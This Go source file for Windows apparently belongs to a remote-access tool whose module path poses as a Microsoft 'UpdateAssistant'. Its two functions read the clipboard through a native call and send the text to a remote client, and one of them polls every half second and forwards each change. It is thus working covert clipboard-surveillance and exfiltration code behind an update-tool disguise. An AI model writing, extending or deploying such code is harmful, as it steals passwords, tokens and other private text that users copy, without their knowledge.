//go:build windows

package system

import (
	"runtime"
	"time"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
)

func sendClipboard(s *session) {
	buf := make([]byte, config.CmdBuf)
	n, err := s.d.clip.Call("clipboard_get", uintptr(unsafe.Pointer(&buf[0])), uintptr(config.CmdBuf))
	text := ""
	if err == nil {
		text = string(buf[:int(n)])
	}
	s.client.Send("system_clipboard", map[string]string{"text": text})
}

func watchClipboard(s *session) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	defer s.wg.Done()
	r, _ := s.d.clip.Call("clipboard_watch_start")
	if int(r) == 0 {
		return
	}
	t := time.NewTicker(500 * time.Millisecond)
	defer t.Stop()
	for {
		select {
		case <-s.stop:
			s.d.clip.Call("clipboard_watch_stop")
			return
		case <-t.C:
			r, _ := s.d.clip.Call("clipboard_poll")
			if int(r) == 1 {
				sendClipboard(s)
			}
		}
	}
}